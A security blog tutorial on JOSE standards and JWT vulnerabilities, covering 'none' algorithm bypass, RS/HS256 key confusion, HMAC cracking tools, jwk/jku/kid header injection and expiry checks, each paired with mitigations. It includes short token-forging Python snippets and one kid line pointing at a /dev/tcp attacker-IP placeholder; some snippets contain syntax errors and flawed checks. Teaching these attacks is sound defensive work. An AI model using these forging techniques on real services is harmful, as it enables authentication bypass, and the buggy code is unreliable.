---
draft: false
author: ladybuginthemug
title: JOSE
description: JWT vulnerabilities
date: 
categories: []
---
### What is JOSE?

[`JOSE`](https://datatracker.ietf.org/doc/html/rfc7165) (JavaScript Object Signing & Encryption)  is a collection of specifications that consist of  the following components :

* [`JWT`](https://datatracker.ietf.org/doc/html/rfc7519)  - JSON Web Token standard - is [JSON](https://www.json.org/json-en.html) hash ( base64url encoding ) with `claims`, that is signed by `JWS` or encrypted by  `JWE`, and serialized.

* [`JWS`](https://datatracker.ietf.org/doc/html/rfc7515) JSON Web Signature -  defines how to handle signed claims 

* [`JWE`](https://datatracker.ietf.org/doc/html/rfc7516) JSON Web Encryption  - defines how to  encryption/decryption of claims

### Why and where it is used?

Once the user is logged in, each subsequent request will include the JWT, with a small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)

Here are some scenarios where JSON Web Tokens are useful:
- developers usually use JWT to avoid server-side storage for sessions 
- authentication,  access control mechanisms

For example: SSO ( Single Sign-on) 

___
### How?

First. I want  to start with straightening things up between JWT, JWS, and JWE. What is what? Where does JWT end and JWS begin? Is it all the same? 

----
#### JWT vs JWS
---

##### JWT  

Due to compact serialization `JWT` has two parts:  a `header`, and a `payload`

```bash 
JWT = Base64Url(header) + '.' + Base64Url(payload)

```


All JWTs consist of a header and payload, which are JSON objects.  It is not signed and not encrypted.

---
##### JWS  

`JWS `has three parts:  a `header`, a `payload`, and a `signature`. ( hence the name )

```bash

secret = 'your_secret'

# it takes header and payload cuncantened with '.'
data = Base64Url(header) + “.” + Base64Url(payload)

# then data is hashed together with a secret
hashedData = hash( data, secret )

# final result is encoded
signature = Base64Url( hashedData )

JWS = Base64Url(header) + '.' + Base64Url(payload) + '.' + Base64Url(signature)

```


These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature, and all three components are concatenated with the period. So when someone talks about `JWT` they probably mean `JWS`.

You can spot `JWT aka JWS` in a bearer token header. It will look something like this:

```python
Authorization: Bearer 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ.sDHxelxtDr76W6_XI5uxc5_fInmMEekuP4tNfCsgVQY
```


___

**[1] Header :**

```bash
header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."

```

`JWS` header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.

```bash
decoded_header = 
{ 
		"alg":"HS256", #  HMAC SHA-256 algorithm
		"typ":"JWT"  # JSON Web Token  
		
}  

```



___

**[2] Payload :**

```bash
payload = "eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ"
```

This part contains the actual data encoded in the token. Each assertion is called a `claim`, the developers can add customized claims as they need ( with the exceptions of already registered  claims ), it could include claims like user information, flags, admin rules etc. 

```bash
decoded_payload = 
{
  "flag": "ladybug",
  "name": "inthemug",
  "admin": true
}
```


___

**[3] Signature :**

```bash
signature = "sDHxelxtDr76W6_XI5uxc5_fInmMEekuP4tNfCsgVQY"
```

The signature is used to verify the integrity of the token and ensure that it hasn't been tampered with.

```bash
key = 'your_secret_key'

JWT = Base64Url(header) + '.' + Base64Url(payload)

signature = HMAC-SHA256(key, JWT)


```

---
---
### But what about JWE ?

JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), where the public key is the encryption key and the private key is the decryption key).

|     | private key | public key |
| --- | ----------- | ---------- |
| JWS |    sign and verify         |    only verify        |
| JWE    |        decrypt and encrypt     |   only encrypt         |


`JWS` are signed JSON data that are comprised of **three parts**, while `JWE`s are encrypted JSON data and made up of **five parts**:

```
[1]BASE64URL(UTF8( Protected Header) + '.' +
[2]BASE64URL(Encrypted Key(CEK)) + '.' +
[3]BASE64URL(JWE Initialization Vector(IV)) + '.' + 
[4]BASE64URL(JWE Ciphertext) + '.' +
[5] BASE64URL(JWE Authentication Tag)
```

```json
{
  "protected": "<integrity-protected header contents>",
  "unprotected": <non-integrity-protected header contents>,
  "recipients": [
    {"header": <per-recipient unprotected header 1 contents>,
     "encrypted_key": "<encrypted key 1 contents>"},
     ...
    {"header": <per-recipient unprotected header N contents>,
     "encrypted_key": "<encrypted key N contents>"}],
  "aad":"<additional authenticated data contents>",
  "iv":"<initialization vector contents>",
  "ciphertext":"<ciphertext contents>",
  "tag":"<authentication tag contents>"
}

```


```JSON
{'protected': 'eyJhbGciOiAiUlNBLU9BRVAiLCAiZW5jIjogIkEyNTZHQ00ifQ==', 
'unprotected': {'kid': '12345'}, 
'recipients': [{
'header': {'alg': 'RSA-OAEP'}, 
'encrypted_key': 'K_wBW14TwhcvOvRKnCh95vk0h942SRondffpK-_pc_NNa6TmFbAB6_GmnD0x_XlS7KBy4NJIIh6QBdRs1bU3IEYv-Rvsqznxid4f9kEEN4S2GfiVabPp9UIt9vqAfZIlIusTssK65cgcJPCt_Sia4saKVAlbTFSEJFYc4McNKg1dR1BUYaKRm6OoJnKohWAv4ZeCCYcubeeaDEZvFw_l3J0sJLztUTIW_NEtTDx4gMW0Cvd1igWozi2cEzqKRd_EmDfalf_uh5Czm386JZ44FF4tX929YowHz2Wk7iCz6tqzMFE128fpLve-n112nAcAlBWNolhf390syIqHVkaPtM3dUAh0tZ9yCvKAdkLQvOuSmtlW8_2u1n7jC4X107O_ffim63ILLT8ksLVHTW6VHyYbf89rhXf0Olzp3Qvyhj49qAVIYMpE09RodkryKCZhPHxECOQQIcbGClwMPcob3lGwrjAYLes5VyodilT0pgRNarhf821wXgGZBOht_ii'}],
'aad': 'QWRkaXRpb25hbCBBdXRoZW50aWNhdGVkIERhdGE=', 
'iv': 'CCiXnNa87DIaHrNZ', 
'ciphertext': 'AdTyQEqOWYxuRnoxa4dwGdeVk-PwiGN5i-EpeVtTLFKKGGowJv_Hbw==', 
'tag': 'CjpKjbUZp29ZQXkwtURkmw=='}
```

#### JWA
 
 The encryption algorithms permitted by JWE are spelled out in [RFC 7518](https://tools.ietf.org/html/rfc7518#page-2), which comes in two sections:

```bash
# key encryption 
"alg" for JWS: 
    HS256, HS384, HS512 (HMAC with SHA), 
    RS256, RS384, RS512 (RSASSA-PKCS-v1_5 with SHA), 
    ES256, ES384, ES512 (ECDSA with SHA), 
    PS256, PS384, PS512 (RSASSA-PSS with SHA for digest and MGF1)

"alg" for JWE: 
    RSA1_5, RSA-OAEP, RSA-OAEP-256,  
    A128KW, A192KW, A256KW (AES Keywrap), 
    dir (direct encryption), 
    ECDH-ES (EC Diffie Hellman Ephemeral+Static key agreement), 
    ECDH-ES+A128KW, ECDH-ES+A192KW, ECDH-ES+A256KW (with AES Keywrap), 
    A128GCMKW, A192GCMKW, A256GCMKW (AES in GCM Keywrap), 
    PBES2-HS256+A128KW, PBES2-HS384+A192KW, PBES2-HS512+A256KW 
    (PBES2 with HMAC SHA and AES keywrap)

# message encryption
"enc" for JWE: 
    A128CBC-HS256, A192CBC-HS384, A256CBC-HS512 (AES in CBC with HMAC), 
    A128GCM, A192GCM, A256GCM ( AES in GCM )
```


________________
## Vulnerabilities

Like any technology, if you do installment and configuration without a guide or expertise you can do more harm than benefits. 
Below we are going to explore a few common vulnerabilities. 

* JWS - Weak signatures and insufficient signature validation:
	- **JWT 'none' algorithm confusion**
	-  **The RS/HS256 public key mismatch vulnerability**
	-  **Null signature vulnerability**
	
	 - jwk - Do Not Trust received claims:
		* **jwk injection vulnerability**
		* jwk SSRF attacks 

I won't go deep into cryptography, which is its own can of worms.
*  - Weak symmetric keys
	* HMAC - offline brute-force
	* RSA - algorithm confusion 



---
### [ CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability ]
---

To understand how this vulnerability work you need to know how symmetrical and asymmetrical encryption  work. If you know already, go ahead and just skip this part.

----
| Symmetrical encryption |
| ---------------------- |


The algorithm `"HS256"`  stands for keyed-**H**ash **M**essage **A**uthentication **C**ode (`HMAC`) using **S**ecure **H**ash **A**lgorithm (`SHA256` - 256 bits aka 32 bytes aka 64 hex chars).

HMAC signed keys (algs `HS256/HS384/HS512`) use symmetric encryption, meaning the `key that signs` the token is also `used to verify it`. 

Often these are set to simple passphrases/passwords. 
```bash
HMAC_key = 'fluffy_the_cat'

```

#### Example

```python
import jwt  
import base64  
  
# Create a valid JWT  
payload = { "flag":"ladybug", "name":"inthemug", "admin": True}  
token = jwt.encode(payload, 'secret_key', algorithm='HS256')  

print(token) 
#'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibGFkeWJ1ZyIsImlhdCI6OTAwMDAwMDAsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ.oA0NXipJEgr2vSsytsOXrUXDj8EHwWrHvaIduLCYns0'

print(jwt.decode(token, 'secret_key', algorithms='HS256'))
#{'flag': 'ladybug', 'name': 'inthemug', 'admin': True}

```

#### Attack

If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token.

to name a few:
- [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
- https://github.com/openwall/john
- - [https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) (converts the token to john the ripper format
- [https://github.com/AresS31/jwtcat](https://github.com/AresS31/jwtcat)   `python`
- [https://github.com/lmammino/jwt-cracker](https://github.com/lmammino/jwt-cracker)  `node.js`
- [https://github.com/brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)  `c`



 | Mitigation                                                                                               |
 | -------------------------------------------------------------------------------------------------------- |
 | Skip HMAC signing and go for asymmetric crypto. It's a lot stronger.                                     |
 | If you can't skip then make sure you use long, random key stings and do not forget to rotate them often. |




---
| Asymmetrical keys |
| ----------------- |


RSA is one of the most widely used cryptosystems today. It was developed in 1977 by Ron Rivest,
Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm. 

> private key  -  used for `signing` ( encryption )
> 
> public key  - used for `verifing` ( decryption )

Asymmetric keys should provide better security but still, they have some weaknesses if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications. 

#### Example

To sign with RSA keys you first need to create them. You have two options:

| [1] ssh-keygen |
| -------------- |

```bash
# help
ssh-keygen --help

# [ -t type] [ -N new-passphrase ] [-f output keyfile]
ssh-keygen -t rsa -N '' -f key 


# - e [-f input_keyfile] [-m key_format]
# serialization to PEM format
ssh-keygen -f key.pub -m PEM -e > key.pem

# create pub/private keys
/current_working_dir/
key
key.pub
key.pem

```

| [2] cryptography libraries |
| -------------------------- |


```python
import jwt  
from cryptography.hazmat.primitives import serialization  
  
  
payload = {  
    "sub": "123",  
    "name": "Ladyinthemug",  
}  
    
# read and load the key  
private_key = open('key', 'r').read()  
# serialize it
private_key = serialization.load_ssh_private_key(private_key.encode(), password=b'')  

public_key = open('key.pub', 'r').read()
public_key = serialization.load_ssh_public_key(public_key.encode())  



```

more advanced - do that only if you know what you are doing 

```python
import jwt  
from cryptography.hazmat.primitives.asymmetric import rsa  
  

# Generate an RSA public key (you can use an existing key)  
private_key = rsa.generate_private_key(  
    # use small fixed value, choosing non-standart large values may case security risk
    public_exponent=65537,  
    # key size (or modulus) in bits, the larger it is the higher security,
    # but slower and need more computational power for gen, enc or decryption.
    key_size=2048  
                   
)  

public_key = private_key.public_key()  


# serialization of private/public keys to PEM format
private_pem = private_key.private_bytes(  
    encoding=serialization.Encoding.PEM,  
    format=serialization.PrivateFormat.PKCS8,  
    encryption_algorithm=serialization.NoEncryption()  
)  
  

public_pem = public_key.public_bytes(  
    encoding=serialization.Encoding.PEM,  
    format=serialization.PublicFormat.SubjectPublicKeyInfo  
)


```
| [3] encoding/decoding |
| --------------------- |

```python
# create token
token = jwt.encode(payload=payload, key=private_key, algorithm='RS256')  

print(token)  
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiTGFkeWludGhlbXVnIn0.JxvICbCwpo6F4Q5haz668JzoCn6A900dkHD_fA5IT6R026DTwnlyR3LxZiMQfwWmWP6excgS92Re8LHn62XObDD9F2hd3y0tS5iEUu0AoiW21TCH2VhOAn4ZseScIuPy5CWsVhj9RGm4vj3QJadvcj6XjFgHq_wIcRIe_FbT28ad-kYQMEwKlAq0VFWoimCB0H1dGZ4pmB8x5XN3g4t8IkUij0-wPDvqwDvndbB3n2FTTKpZGkzR5D24PLor9VjD8cQmHwbO6eTETkPLzniId2JccKl3XhOWnLAGCuXGvqkleoD9GTc068xSy7bln-JyfvnzsdbrkGU-M_1ZexmPKT_vP5avwGvEvP38rYo5gW3NumMvWhm3clA9rAm2Ld9s_80uIAI4Te0AR3TzC-stl28nRqdN3umTgW1mAcuO2sNhFy-M7TZH6U-u0Dp8YljNIU6sCKtx8VL0VkbT3Cn2rm08KqxCw3Nn1t3j6-EZBKPHRBRTWp43wRQSK9hRE_Bh

# decode
print(jwt.decode(jwt=token, key=public_key, algorithms=['RS256', ]))
# {'sub': '123', 'name': 'Ladyinthemug'}

```

---
#### Attack

 If the server is expecting RSA: private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the `public key`is actually an `HMAC secret key`! 
 
#### the scenario of such an attack could go like this:
 
* [1] your RSA public key of the token is been obtained/exposed somehow ( sometimes it's transmitted with `JWT` itself, or check out more ways to [find_public-keys](https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys))

* [2] confirmed that the format of the public key is right ( you can expect it to be in [PEM format](https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail))
 
**`PEM` format** is a way of encoding binary/DER data in a way that is more convenient. It derives from a 1990s attempt at secure email named `Privacy-Enhanced Mail` hence the name.
 
The data content is `base64-encoded`, and the encoded data is typically broken into lines of 64 characters (or 76 characters in MIME format), except for the last line, which may be shorter. 

```python
-----BEGIN TYPE OF DATA-----
Base64-encodedDataLine1
Base64-encodedDataLine2 ...

Base64-encodedLastline 
-----END TYPE OF DATA-----
```


* [3] header tampered by switching RSA -> HS256 

```bash 

[1]header
	alg: "RS256" -> "HS256"
	typ: "JWT"

[2] tampered payload
	sub: 'ladybug'
	role: 'user'  -> "admin"

```


* [4] obtained a public RSA key used as a symmetric key for HMAC.

* [5] tampered token sent to the server.


---
| Mitigation                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------- 
| The JWT configuration should only allow  either the HMAC algorithms _**OR**_ the Public Key algorithms, never both. 

```python
# Determine the type of token you want to generate (HMAC or RSA)
generate_hmac_token = True  # change to False for RSA token for example 

```


---
### [ CVE-2015-2951 - 'none' algorithm confusion]
---

JWTs can be signed using a range of different algorithms, but can also be left unsecured. In this case, the JWT `alg` parameter is set to `none`, meaning the backend will not perform signature verification.

Due to the obvious dangers of this, secure servers usually reject tokens with no signature. 
However, the attacker might still have a chance to bypass weak filters ( string parsing ), using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (`NonE`, `nONE`... )

#### Example

```bash
[1] Token header values:
{
	 "typ" = "JWT"
	 "alg" = "HS256"
}

[2] We temper it with none:
{
	 "typ" = "JWT"
	 "alg" = "none" # 'NoNe', 'nONE' etc
}

 [3] Token payload values stay the same:
{
	 "flag" = "ladybug"
	 "name" = "inthemug"
	 "admin" = True
}

[4] By switching the algorithm to 'none' you ditch the signature and can gain the bypass.

```
---

* However, this won't work unless you **remove** the signature 

```bash
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ.['deleted signature'] 

```

* Alternatively 

```python
decoded=jwt.decode(jwtToken, verify=False)  # need to decode the token before encoding with type 'None'
newtoken=jwt.encode(decodedToken, key='', algorithm=None)

print(newtoken.decode())

```

| Mitigation |
| ---------- |
|    [ Use up-to-date libraries :)](https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733)




---
### [ CVE-2018-0114 - JWT header parameter injections]
---


Among other things, the JWS headers often contain several other parameters. 

##### The following ones are of particular interest to attackers :

|  |  |
| --- | ---------------- |
|   jwk  | creates an embedded JSON object representing the key               |
| jku | set URL from which servers can fetch a set of keys containing the correct key|
| kid | provide an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from|


---
| `jwk` JSON Web Key     |
| -------------------- |

  
   You can exploit it by signing a modified JWS using your own **RSA private key,** then **embedding the matching public key** in the `jwk` header.
#### Example

```python
# Define your payload
payload = {"sub": "1234", "name": "ladybuginthemug"}

# Load your private key
private_key = open("private_key.pem").read()

# Create a JWT token with a modified header and payload
token = jwt.encode(payload, private_key, algorithm='RS256', headers={"jwk": {"kty": "RSA", "n": "your_public_key_n", "e": "your_public_key_e"}})

print(token)

```


  You can also perform this attack manually by adding the `jwk` header yourself. However, you may also need to update the JWS's `kid` header parameter to match the `kid` of the embedded key.


```python
# Modify the header to include the 'jwk' parameter
modified_header = {"alg": "RS256", "jwk": {"kty": "RSA", "n": "your_public_key_n", "e": "your_public_key_e"},"kid": "your/kid/somewhere"}

# Decode the existing token
decoded_payload = jwt.decode(existing_token, verify: False)
deecoded_payload = decoded_payload[1]

# Create a new token with the modified header and the same payload
new_token = jwt.encode(decoded_payload, headers=modified_header, algorithm='RS256')

print(new_token)

```

 Example of mitigation 

```python
# Add audience (aud) claim to prevent usage on different websites
payload["aud"] = "example.com"

# Verify the token with additional checks
try:
    decoded_payload = jwt.decode(token, algorithms=["RS256"], options={"require": ["alg", "kid", "aud"]})
    print(decoded_payload)
except jwt.ExpiredSignatureError:
    print("Token has expired.")
except jwt.InvalidTokenError:
    print("Token is invalid.")


```


---


| Mitigation                                                                                                                                                                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Many libraries today report `"alg": "none"` values as invalid, so choose up to date libraries.                                                                                                             |
| If you don't want to just rely on `"alg"` claims and libraries you use, add additional input to the verification function that will specify a supported set of algorithms and reject unsecured JWT values. |
| Include the `aud` (audience) claim to specify the intended recipient of the token. (this prevents it from being used on different websites).                                                               |
| Enable the issuing server to revoke tokens (on logout, for example).                                                                                                                                       |





______________________
| `jku` JSON Web Key Set URL   |
| ---  |


 Instead of embedding public keys directly using the `jwk` header parameter, some servers let you use the `jku` (JWK Set URL) header parameter to reference a <u>JWK Set</u>(URL) containing the key. 
 
 When verifying the signature, the server fetches the relevant key from this <u>URL</u>(JWK Set).
 
 More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.
####  Example

You can tamper the jku header so it will point to a web service that you are in control and server will try to load the keys from there. 

 Example of mitigation
```python

permitted_hosts = ["trusted-server.com"]

# Check if the 'jku' header is in the whitelist
if "jku" in decoded_payload and decoded_payload["jku"] not in permitted_hosts:
    print("Invalid 'jku' header detected.")
else:
    print("Token is valid.")


```

| Mitigation                                                              |
| ----------------------------------------------------------------------- |
| Enforce a strict whitelist of permitted hosts for the `jku` header. |                                                                        |
| Avoid sending tokens in URL parameters where possible.|
|Ensure that no cookies sent in the GET request            |


________
| `kid` Key ID      |
| ---  |

 Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. 

Depending on the format of the key, this may have a matching `kid` parameter

 Verification keys are often stored as a <u>JWK Set</u>. In this case, the server may simply look for the <u>JWK with the same `kid` as the token.</u> However, the JWS specification doesn't define a concrete structure for this ID - <u>it's just an arbitrary string of the developer's choosing.</u>

#### Example

*some might use the `kid` parameter to point to a particular entry in a database or even the name of a file. 

```bash
# For example if 
"kid":"key/12345” 

# search at
http://*/key/12345 
http://*/key/12345.pem 
```
 
* If this parameter is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.

	* This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, and then sign the JWT using a secret that matches the contents of this file.

```
"kid":"/dev/tcp/_yourIP_/_yourPort_
```

* You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with an empty string will result in a valid signature

 | Mitigation                                                                               |
 | ---------------------------------------------------------------------------------------- |
 | By validating and/or sanitizing the received values make sure that you're not vulnerable |
 | path traversal                                                                           |
 | SQL or LDAP injection                                                                    |



---
#### Is exp checked?
---

The “exp” claim is used to check the expiry of a token. As JWTs are often used in the absence of session information, so they do need to be handled with care - in many cases capturing and replaying someone else’s `JWT` will allow you to masquerade as that user.  

One mitigation against JWT replay attacks (that is advised by the JWT RFC) is to use the “exp” claim to set an expiry time for the token. It is also important to set the relevant checks in place in the application to make sure this value is processed and the token rejected where it is expired. If the token contains an “exp” claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed. 
Use jwt_tool to read the content of the token: decoding includes timestamp parsing and expiry checking (timestamp in UTC)

| If the token still validates in the application then this may be a security risk as the token may NEVER expire. |
| --------------------------------------------------------------------------------------------------------------- |

Example of 'mitigation'
```python
try:
    # Decode the JWT token
    decoded_token = jwt.decode(token, public_key, algorithms=["RS256"])

    # Get the current time in UTC
    current_time = datetime.utcnow()

    # Check if the token has expired
    if "exp" in decoded_token and current_time > datetime.utcfromtimestamp(decoded_token["exp"]):
        print("Token has expired.")
    else:
        print("Token is valid.")
except jwt.ExpiredSignatureError:
    print("Token has expired.")
except jwt.InvalidTokenError:
    print("Token is invalid.")
```


---
### Denial-of-service attacks
 
 Like any denial-of-service attack, the goal is to overwhelm the services to bring them down.

 An attacker could supply content using keys that would result in excessive cryptographic processing, for example, keys larger than those mandated in this specification.

 | Mitigation |
 | ---------- |
 |      Receiving agents that validate signatures and sending agents that encrypt messages need to be cautious of cryptographic processing usage when validating signatures and encrypting messages **using keys larger than those mandated in this specification**. Implementations should set and enforce upper limits on the key sizes they accept.       |



```python
# Define the maximum allowed key size (like 2048 bits for RSA)
max_key_size = 2048

# Check if the key size exceeds the maximum allowed size
if key_size > max_key_size:
    print("Key size exceeds the maximum allowed size.")
    # Handle the error or reject the key
else:
    print("Key size is within the allowed limit.")
    # Perform cryptographic operations using the key

```

 [Section 5.6.1](https://www.rfc-editor.org/rfc/rfc7518.html#section-5.6.1)
   (Comparable Algorithm Strengths) of NIST SP 800-57 [[NIST.800-57](https://www.rfc-editor.org/rfc/rfc7518.html#ref-NIST.800-57)]
   contains statements on largest approved key sizes that may be
   applicable.


____
## Summarry:


- Use an` up-to-date library `
- Do not store sensitive data in the payload
- Use asymmetric keys if the tokens are used across more than one server
- Use strong keys/secrets
- Make sure that you perform robust `signature verification on any JWTs that you receive`, and account for edge-cases such as `JWT` signed using unexpected algorithms.
- Make sure that you're not vulnerable to [path traversal](https://portswigger.net/web-security/file-path-traversal) or SQL injection via the `kid` header parameter.
- Always set an `expiration date` for any tokens that you issue.
- `Avoid sending tokens in URL` parameters where possible.
- Include the `aud` (audience) claim (or similar) to `specify the intended recipient `of the token. This prevents it from being used on different websites.
- Enable the issuing server to revoke tokens (on logout, for example).

___
### Links

https://portswigger.net/web-security/jwt#what-are-jwts

[https://jwt.io/introduction/](https://jwt.io/introduction/)

https://openid.net/developers/how-connect-works/

https://www.iana.org/assignments/jose/jose.xhtml

https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

https://portswigger.net/web-security/file-path-traversal

[https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

https://github.com/dwyl/learn-json-web-tokens

https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail

(https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail)
